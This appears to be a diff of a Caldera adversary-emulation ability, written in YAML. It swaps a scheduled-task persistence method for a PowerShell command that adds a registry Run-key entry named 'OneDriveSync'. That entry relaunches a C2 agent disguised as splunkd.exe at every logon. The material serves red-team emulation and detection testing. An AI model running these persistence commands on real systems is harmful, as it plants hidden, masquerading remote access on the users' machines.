@@ -1,23 +1,22 @@
 - id: 7d2d7e30-1a73-45d5-8a24-943a41c6999a
-  name: Scheduled Task Persistence (User Logon)
-  description: Creates a scheduled task to re-establish C2 by executing the existing agent executable every time the user logs on. Masquerades as a common cloud sync application. Relies on a correctly configured C2 server address in Caldera.
+  name: Persistence via Registry Run Key
+  description: Establishes persistence by creating a new entry in the HKCU\...\Run registry key. This method is a common alternative to Scheduled Tasks, especially in hardened environments where task creation is restricted. The agent will execute every time the user logs on.
   tactic: persistence
   technique:
-    attack_id: T1053.005
-    name: "Scheduled Task/Job: Scheduled Task"
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
   platforms:
     windows:
       psh:
-        # NOTE: This command relies on the '#{server}' and '#{group}' global variables.
-        # The '#{server}' variable is populated from the 'app.contact.http' setting in Caldera's config file.
-        # This MUST be set to a reachable IP for the agent to connect.
         command: |
-          $agentExe = "C:\Users\Public\splunkd.exe";
-          $agentCmd = "-server #{server} -group #{group} -v";
-          schtasks /create /tn "OneDrive Sync Service" /tr "$($agentExe) $($agentCmd)" /sc onlogon /f;
+          $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
+          $entryName = "OneDriveSync";
+          $command = "C:\Users\Public\splunkd.exe -server #{server} -group #{group} -v";
+          Set-ItemProperty -Path $runKeyPath -Name $entryName -Value $command -Force;
+          Get-ItemProperty -Path $runKeyPath -Name $entryName | Format-List -Property $entryName;
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
-            - source: 'host.persistence.scheduled_task'
+            - source: 'host.persistence.registry_run_key'
               custom_parser_vals:
-                regex: 'SUCCESS: The scheduled task "(.+)" has successfully been created.'
+                regex: '^(\S+)\s+:'
                 edge_label: 'has_persistence_method'
